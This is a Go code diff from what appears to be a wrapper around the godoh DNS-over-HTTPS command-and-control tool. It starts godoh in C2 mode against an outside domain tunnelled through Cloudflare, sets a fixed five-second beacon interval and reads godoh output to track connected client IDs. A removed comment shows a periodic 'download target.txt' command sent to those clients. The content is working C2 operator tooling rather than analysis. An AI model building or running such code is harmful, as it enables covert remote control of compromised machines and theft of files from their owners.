@@ -5,26 +5,22 @@ import (
 	"go-godoh-proxy/godoh"
 	"go-godoh-proxy/grater"
 	"go-godoh-proxy/logger"
-	"math/rand"
 	"time"
 )
 
 func main() {
 	// 创建godoh c2客户端
-	p, err := child.CreateChildProcess(`godoh`, "c2", "-d", "tunnel.safecv.cn", "-p", "cloudflare")
+	p, err := child.CreateChildProcess(`godoh`, "c2", "-d", "send.tunvision.work", "-p", "cloudflare")
 	if err != nil {
 		panic(err)
 	}
 	logger.Log("子进程创建成功")
 	p.Handle(func(stream *child.IOStream) {
 		isRunning := true
-		randSecond := time.Duration(35 + rand.Int31n(10) - 5)
+		randSecond := time.Duration(5)
 		//设置间隔时间
 		sendDuration := time.Second * randSecond
 		//设置每隔一段时间执行的命令
-		//sendCommands := []string{
-		//	"download target.txt",
-		//}
 		logger.Log("系统启动")
 		//创建一个逐行扫描识别器，该识别器用于识别godoh的输出获得连接的客户端的id
 		i := godoh.NewIdentityReader(stream)
